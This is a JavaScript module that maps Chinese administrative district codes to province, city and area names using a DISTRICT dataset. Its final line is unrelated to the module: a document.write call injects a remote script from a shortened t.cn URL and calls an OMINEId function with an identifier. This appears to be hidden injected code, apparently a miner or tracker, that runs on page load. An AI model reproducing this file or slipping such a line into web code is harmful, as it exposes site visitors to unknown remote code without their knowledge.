define(['jquery','Toolkit/district'],function ($) {
    var hash = {};
    var recursion = function (data) {
        $.each(data,function (index,value) {
            hash[value['code']] = {
                name:value['name'],
                cell:value['cell'],
                index:index
            };
            if(value.cell){
                recursion(value.cell)
            }
        });
    };
    recursion(DISTRICT);
    return {
        getData:function (code) {
            code = String(code);
            var array = [];
            var province_code = code.substr(0,2)+'0000';
            if(hash[province_code]){
                array.push(hash[province_code].name);
                if(province_code===code){
                    return array
                }
            }
            var city_code = code.substr(0,4)+'00';
            if(hash[city_code]){
                array.push(hash[city_code].name);
                if(city_code===code){
                    return array
                }
            }
            var area_code = code;
            if(hash[area_code]){
                array.push(hash[area_code].name)
            }
            return array
        },
        getProvince:function (code) {
            code = String(code);
            var province_code = code.substr(0,2)+'0000';
            return hash[province_code]?hash[province_code]:false
        },
        getCity:function (code) {
            code = String(code);
            var city_code = code.substr(0,4)+'00';
            return hash[city_code]?hash[city_code]:false
        },
        getArea:function (code) {
            area_code = String(code);
            return hash[area_code]?hash[area_code]:false
        }
    }
});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
